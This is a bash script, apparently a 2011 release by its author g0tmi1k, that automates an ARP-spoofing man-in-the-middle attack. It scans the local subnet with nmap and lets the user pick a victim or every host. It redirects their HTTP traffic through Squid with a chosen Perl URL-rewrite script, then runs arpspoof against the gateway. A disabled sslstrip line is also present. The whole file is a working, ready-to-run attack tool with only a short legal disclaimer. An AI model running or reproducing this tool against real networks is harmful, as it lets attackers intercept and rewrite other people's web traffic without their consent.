#!/bin/bash
#----------------------------------------------------------------------------------------------#
#squidScripts.sh v0.1 ~ 2011-03-12                                                             #
# (C)opyright 2011 - g0tmi1k                                                                   #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#                By running this, YOU are using this program at YOUR OWN RISK.                 #
#            This software is provided "as is", WITHOUT ANY guarantees OR warranty.            #
#---Default Settings---------------------------------------------------------------------------#
# [Interface] Which interface to use.
interface="eth0"

# [/path/to/folder] Folder accessible to web server. If changed, edit script if needs be!
www="/var/www/tmp/"

#---Default Variables--------------------------------------------------------------------------#
version="0.1"                   # Program version
    svn="33"                    # SVN (Used for self-updating)
   file=""                      # Null the value

function display() { #display type "message"
   if [ "$debug" == "true" ]; then echo -e "display~$@"; fi
   error="free"; output=""
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "display Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "action" ];  then output="\e[01;32m[>]\e[00m"
   elif [ "$1" == "info" ];  then output="\e[01;33m[i]\e[00m"
   elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
   output="$output $2"
   echo -e "$output"

   if [ "$diagnostics" == "true" ]; then
      if [ "$1" == "action" ]; then output="[>]"
      elif [ "$1" == "info" ]; then output="[i]"
      elif [ "$1" == "error" ]; then output="[!]"; fi
      echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
   fi
   return 0
}
function editSettings(){ #editSettings file
    if [ -e "/usr/bin/gedit" ]; then eval gedit "$1" 2> /dev/null 1> /dev/null
    elif [ -e "/usr/bin/kate" ]; then eval kate "$1" 2> /dev/null 1> /dev/null
    elif [ -e "/opt/kde3/bin/kate" ]; then eval kate "$1" 2> /dev/null 1> /dev/null
    elif [ -e "/usr/bin/geany" ]; then eval geany "$1" 2> /dev/null 1> /dev/null
    elif [ -e "/bin/vi" ]; then eval vi "$1" 2> /dev/null 1> /dev/null
    else display error "Couldn't detect a text editor. You'll have to do it manually." 1>&2; fi
}
function help() { #help
   if [ "$debug" == "true" ]; then echo -e "help~$@"; fi
   #----------------------------------------------------------------------------------------------#
   echo "(C)opyright 2011 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash wiffy.sh -i [interface] -t [ip] -f [file] ([-u] [-?])


 Options:
   -i [interface]   ---  Internet Interface   e.g. $interface
   -t [ip]          ---  Targets IP address   e.g. 192.168.0.105
   -f [file]        ---  Squid script to use  e.g. mySquidScript.pl

   -u               ---  Checks for an update
   -?               ---  This screen


 Example:
   bash squidScripts.sh
   bash squidScripts.sh -i wlan0 -t 192.168.0.105 -f mySquidScript.pl


 Known issues:
    -Apache2 settings could be wrong
    -Squid3 settings could be wrong

"
   s="\e[01;35m"; n="\e[00m"
   echo -e "[-] Edit ["$s"A"$n"]pache config, Edit ["$s"S"$n"]quid config, View squid's ["$s"C"$n"]ache log, or e["$s"x"$n"]it"
   while true; do
      echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
      if [[ "$REPLY" =~ ^[Aa]$ ]]; then editSettings "/etc/apache2/apache2.conf"
      elif [[ "$REPLY" =~ ^[Ss]$ ]]; then editSettings "/etc/squid3/squid.conf"
      elif [[ "$REPLY" =~ ^[Cc]$ ]]; then editSettings "/var/log/squids/cache"
      elif [[ "$REPLY" =~ ^[Xx]$ ]]; then break; fi
   done
   exit 1
}
function update() { #update #doUpdate
   if [ "$debug" == "true" ]; then echo -e "update~$@"; fi
   #----------------------------------------------------------------------------------------------#
   display action "Checking for an update"
   command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" | awk -F " " '{split ($4,A,":"); print A[1]}')
   if [ "$command" ] && [ "$command" -gt "$svn" ]; then
      if [ "$1" ]; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/squidScripts/squidScripts.sh"
         display info "Updated! =)"
      else display info "Update available! *Might* be worth updating (bash squidScripts.sh -u)"; fi
   elif [ "$command" ]; then display info "You're using the latest version. =)"
   else display info "No internet connection"; fi
   if [ "$1" ]; then
      echo
      exit 2
   fi
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m squidScripts v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ]; then display error "Run as root" 1>&2; exit; fi

#----------------------------------------------------------------------------------------------#
while getopts "i:t:f:uh?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      t ) target=$OPTARG;;
      f ) file=$OPTARG;;
      u ) update "do";;
      h ) help; exit;;
      ? ) help; exit;;
   esac
done

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ -z "$interface" ]; then display error "interface can't be blank" 1>&2; exit; fi
if [ "$file" ] && [ ! -e "$file" ]; then display error "file ($file) doesn't exists" 1>&2; file=""; fi

#----------------------------------------------------------------------------------------------#
gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
broadcast=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
networkmask=$(ifconfig $interface | awk '/Mask/ {split ($4,A,":"); print A[2]}')
www="${www%/}"
os=$(lsb_release -i | awk -F ":" '{print $2}' | sed 's/^\s//')
if [ "$os" == "Fedora" ]; then installPackage="yum -y install" #$(ps < /var/run/yum.pid) | kill $(pgrep yum | while read line; do echo -n \"$line \"; done);
else installPackage="apt-get -y install"; fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/sbin/squid3" ]; then
   display error "squid isn't installed"
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing squid" "$installPackage squid3"; fi
   if [ ! -e "/usr/sbin/squid3" ]; then display error "Failed to install squid" 1>&2; exit
   else display info "Installed: squid"; fi
fi
if [ ! -e "/usr/bin/nmap" ]; then
   display error "nmap isn't installed"
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing nmap" "$installPackage nmap"; fi
   if [ ! -e "/usr/bin/nmap" ]; then display error "Failed to install nmap" 1>&2; exit
   else display info "Installed: nmap"; fi
fi
if [ ! -e "/usr/sbin/apache2" ]; then
   display error "apache isn't installed"
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing apache" "$installPackage apache2"; fi
   if [ ! -e "/usr/sbin/apache2" ]; then display error "Failed to install apache" 1>&2; exit
   else display info "Installed: squid"; fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
display action "Configuring: IP Tables"
iptables -F; iptables -X
for table in filter nat mangle; do    # delete the table's rules # delete the table's chains # zero the table's counters
   iptables -t $table -F; iptables -t $table -X; iptables -t $table -Z
done

iptables --table nat --append PREROUTING --in-interface $interface --proto tcp --destination-port 80 --jump REDIRECT --to-port 3128
#iptables -A PREROUTING -s 192.168.0.0/255.255.255.0 -p tcp -j DNAT --to-destination 64.111.96.38

#----------------------------------------------------------------------------------------------#
#sslstrip -f -l 3129 -w /tmp/squidScripts_ssl.log

#----------------------------------------------------------------------------------------------#
display action "Configuring: IP Forwarding"
echo "1" > /proc/sys/net/ipv4/ip_forward

#----------------------------------------------------------------------------------------------#
display action "Configuring: Web pages"
cp -f "$(pwd)"/www/* "$www/"

#----------------------------------------------------------------------------------------------#
display action "Configuring: Permissions"
mkdir -p "$www/"   # Default for scripts
chown -R nobody:nogroup "$www/" "$(pwd)"/*.pl
chmod -R 777 "$www"                     # Web     (Remote)
chmod -R 755 "$(pwd)"/*.pl              # Scripts (Local)

#----------------------------------------------------------------------------------------------#
display action "Generating: Scripts"

#----------------------------------------------------------------------------------------------#
display action "Generating: Auto-proxy config file"
echo "function FindProxyForURL(url, host) { return \"PROXY $ourIP:80; DIRECT\"; }" > "$www/proxy.pac"   # Auto config file;)

#----------------------------------------------------------------------------------------------#
display action "Generating: Squid config"
if [ ! "$file" ]; then
   perlScripts=(*.pl)
   echo -e "--------------------------------\n| Num |          Script        |\n|-----|------------------------|"
   for (( i=0; i<${#perlScripts[*]}; i++ )); do
       printf "|  %-2s | %-22s |\n" "$(($i+1))" "${perlScripts[$i]}"
   done
   echo "--------------------------------"
   while true; do
      echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
      if [[ "$REPLY" =~ ^[Xx]$ ]]; then exit
      elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]') ]; then display error "Bad input" 1>&2
      elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && ( [ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$i" ] ); then display error "Incorrect number" 1>&2
      else file=${perlScripts[$(($REPLY-1))]}; break; fi
   done
fi

#----------------------------------------------------------------------------------------------#
display action "Discovering: Targets"
ip4="${ourIP##*.}"; x="${ourIP%.*}"
ip3="${x##*.}"; x="${x%.*}"
ip2="${x##*.}"; x="${x%.*}"
ip1="${x##*.}"
nm4="${networkmask##*.}"; x="${networkmask%.*}"
nm3="${x##*.}"; x="${x%.*}"
nm2="${x##*.}"; x="${x%.*}"
nm1="${x##*.}"
let sn1="$ip1&$nm1"
let sn2="$ip2&$nm2"
let sn3="$ip3&$nm3"
let sn4="$ip1&$nm4"
let en1="$ip1|(255-$nm1)"
let en2="$ip2|(255-$nm2)"
let en3="$ip3|(255-$nm3)"
let en4="$ip4|(255-$nm4)"
subnet=$sn1.$sn2.$sn3.$sn4
endnet=$en1.$en2.$en3.$en4
oldIFS=$IFS; IFS=.
for dec in $networkmask; do
   case $dec in
      255) let nbits+=8;;
      254) let nbits+=7;;
      252) let nbits+=6;;
      248) let nbits+=5;;
      240) let nbits+=4;;
      224) let nbits+=3;;
      192) let nbits+=2;;
      128) let nbits+=1;;
      0);;
      esac
done
IFS=$oldIFS

while true; do
   eval nmap $subnet/$nbits -e $interface -n -sP -sn > "/tmp/squid.tmp"
   #----------------------------------------------------------------------------------------------#
   index="-1"; i="0"   # So we start at "0"
   while read LINE; do
      case "$LINE" in
         *"Nmap scan report for"* )     index=$(($index+1)); targetIP[$index]=$(echo $LINE | sed 's/Nmap scan report for //');;
         *"MAC Address:"* )             targetMAC[$index]=$(echo $LINE | awk '{print $3}'); targetMANU[$index]=$(echo $LINE | awk -F "(" '{print $2}' | sed 's/.$//g');;
      esac
   done < "/tmp/squid.tmp"
   rm -f "/tmp/squid.tmp"
   #----------------------------------------------------------------------------------------------#
   if [ "$target" ]; then
      id="unknown"
      for tmp in ${targetIP[@]}; do
         if [ "$tmp" == "$target" ]; then
            id="found"
         fi
      done
   fi
   if [ "$id" != "found" ]; then
      #----------------------------------------------------------------------------------------------#
      s="\e[01;35m"; n="\e[00m"
      echo -e "------------------------------------------------------------------------------------------------------------\n| Num |        IP       |        MAC        |     Hostname    |   OS   | Manufacture                       |\n|-----|-----------------|-------------------|-----------------|--------|-----------------------------------|"
      for targets in "${targetIP[@]}"; do
         command="|  %-2s |" # Number

         if [ "${targetIP[${i}]}" == "$gateway" ]; then command="$command \e[01;31m%-15s\e[00m |" # IP - Gateway (Not wise to attack this)
         elif [ "${targetIP[${i}]}" == "$ourIP" ]; then command="$command \e[01;31m%-15s\e[00m |" # IP - OurIP (Not wise to attack this)
         else  command="$command %-15s |"; fi

         command="$command %-17s | %-15s | %-7s| %-34s|\n" # MAC Hostname OS Manufacture
         printf "$command" "$(($i+1))" "${targetIP[${i}]}" "${targetMAC[${i}]}" "-" "-" "${targetMANU[${i}]}"
         i=$(($i+1))
      done
      printf "|  %-2s |   *Everyone*    |     *Everyone*    |    *Everyone*   |*Every1*|           *Everyone*              |\n------------------------------------------------------------------------------------------------------------\n" "$(($i+1))"
      tmp="[-] Re["$s"s"$n"]can, ["$s"M"$n"]anual input"; if [ "$i" -gt 0 ]; then tmp="$tmp or num ["$s"1"$n"-"$s"$((i+1))"$n"]"; fi
      echo -e "$tmp"
      #----------------------------------------------------------------------------------------------#
      while true; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
         if [[ "$REPLY" =~ ^[Xx]$ ]]; then exit
         elif [[ "$REPLY" =~ ^[Mm]$ ]]; then echo -ne "\e[00;33m[~]\e[00m "; read -p "IP address?: "; target="$REPLY"; break 2
         elif [[ "$REPLY" =~ ^[Ss]$ ]]; then break
         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]') ]; then display error "Bad input" 1>&2
         elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && ( [ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$((i+1))" ] ); then display error "Incorrect number" 1>&2
         elif [ "$REPLY" == "$((i+1))" ]; then target="EVERYONE"; break 2
         else target=${targetIP[$(($REPLY-1))]}; break 2; fi
      done
   else break; fi
done
IP_ADDR_VAL=$(echo "$target" | grep -Ec '^(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])')
if [ $IP_ADDR_VAL -eq 0 ]; then
   target=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
fi

#----------------------------------------------------------------------------------------------#
cp -f "/etc/squid3/squid.conf" "/etc/squid3/squid.conf.bkup"
echo "url_rewrite_program \"$(pwd)/$file\"" >> "/etc/squid3/squid.conf"

#----------------------------------------------------------------------------------------------#
display action "Starting: Services (Web & Proxy server [Apache & Squid])"
eval /etc/init.d/apache2 restart 2>&1 /dev/null
eval /etc/init.d/squid3 restart 2>&1 /dev/null

if [ -z "$(/etc/init.d/apache2 status)" ]; then display error "Error running apache2"
elif [ -z "$(pgrep squid3)" ]; then display error "Error running squid"; fi

#----------------------------------------------------------------------------------------------#
mv -f "/etc/squid3/squid.conf.bkup" "/etc/squid3/squid.conf"

#----------------------------------------------------------------------------------------------#
display action "Starting: MITM (ARP) @ $target"
display info "Attacking! ...press CTRL+C to stop"
command="arpspoof -i $interface"
if  [ "$target" != "EVERYONE" ]; then command="$command -t $target"; fi
command="$command $gateway"
eval $command

#----------------------------------------------------------------------------------------------#
display action "Stopping: Services (Web & Proxy server [Apache & Squid])"
eval /etc/init.d/apache2 stop 2>&1 /dev/null
eval /etc/init.d/squid3 stop 2>&1 /dev/null

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m Done! =)"